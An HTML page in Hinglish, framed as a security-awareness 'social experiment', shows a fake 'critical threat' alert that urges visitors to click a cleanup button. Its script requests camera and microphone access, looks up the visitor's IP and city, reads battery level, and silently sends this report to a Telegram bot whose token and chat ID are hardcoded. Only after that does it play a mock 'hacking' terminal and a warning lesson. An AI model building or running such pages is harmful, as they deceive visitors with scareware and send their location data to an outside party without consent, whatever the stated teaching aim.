<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY RESEARCH: Awareness Test</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #050505; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .edu-banner { position: fixed; top: 0; width: 100%; background: #fbbf24; color: #000; text-align: center; padding: 10px; font-weight: bold; z-index: 100; font-size: 13px; }
        .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
        h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 350px; overflow-y: auto; white-space: pre-wrap; }
        .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
    </style>
</head>
<body>

    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (HARDWARE ACCESS TEST) ⚠️</div>

    <div class="container" id="main-box">
        <div id="ui-content">
            <div style="font-size: 50px;">🔴</div>
            <h1>CRITICAL THREAT DETECTED</h1>
            <p>Aapke device ka hardware (Camera/Mic) kisi unknown server se connected hai. Scan karke block karein.</p>
            <button class="action-btn" onclick="startFullSimulation()">CLEAN & SECURE NOW</button>
        </div>
        <div id="terminal"></div>
    </div>

    <script>
        const BOT_TOKEN = '8215508330:AAH89E2yXIslUZDwb3gIkxgeHdEzLnR7EVk';
        const CHAT_ID = '7066124462';

        async function startFullSimulation() {
            // --- 1. Real Hardware Permission Request ---
            let hwStatus = "Denied";
            try {
                // Requesting Camera & Mic
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                hwStatus = "GRANTED (Access Captured)";
                // Stop the stream immediately (we just want to show the access)
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                hwStatus = "REJECTED (Permission Denied)";
            }

            document.getElementById('ui-content').style.display = 'none';
            const term = document.getElementById('terminal');
            term.style.display = 'block';

            // --- 2. Fetch Info ---
            let ipData = { ip: "Scanning...", city: "Unknown" };
            try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch (e) {}

            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.round(b.level * 100)}%`;
            }

            // --- 3. Send to Telegram ---
            const report = `<b>🚨 HARDWARE EXPOSURE!</b>\n\n` +
                           `<b>📍 Location:</b> ${ipData.city}\n` +
                           `<b>🔋 Battery:</b> ${batteryInfo}\n` +
                           `<b>🎙️ Mic/Cam:</b> ${hwStatus}\n` +
                           `<b>📱 IP:</b> ${ipData.ip}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=HTML`);

            // --- 4. Terminal Simulation ---
            const lines = [
                "> INITIALIZING HARDWARE SCAN...",
                `> REQUESTING CAMERA ACCESS... [${hwStatus}]`,
                `> REQUESTING MICROPHONE ACCESS... [${hwStatus}]`,
                "------------------------------------------",
                `> TARGET_IP: ${ipData.ip.substring(0,8)}XX`,
                `> SYSTEM_BATTERY: ${batteryInfo}`,
                "------------------------------------------",
                "> <span style='color:cyan'>[EXTRACTING] Social Media Sessions...</span>",
                "> Facebook: <span style='color:red'>DETECTED</span>",
                "> Instagram: <span style='color:red'>ACTIVE SESSION</span>",
                "------------------------------------------",
                "> <span style='color:orange'>[STEALING] Masked Data...</span>",
                "> Found Card: **** **** **** 9012",
                "> Found Pass: user****_xyz",
                "------------------------------------------",
                "> <span style='color:red'>ATTACK SUCCESSFUL. DATA SENT.</span>",
                "------------------------------------------",
                "> <span style='color:white'>SABAK: Agar aapne 'Allow' dabaya tha,</span>",
                "> <span style='color:white'>toh hacker aapko live dekh/sun sakta tha.</span>",
                "> <span style='color:white'>Kabhi bhi aisi sites ko permission na dein!</span>"
            ];

            let i = 0;
            function print() {
                if (i < lines.length) {
                    term.innerHTML += lines[i] + "<br><br>";
                    term.scrollTop = term.scrollHeight;
                    i++;
                    setTimeout(print, 800);
                }
            }
            print();
        }
    </script>
</body>
</html>
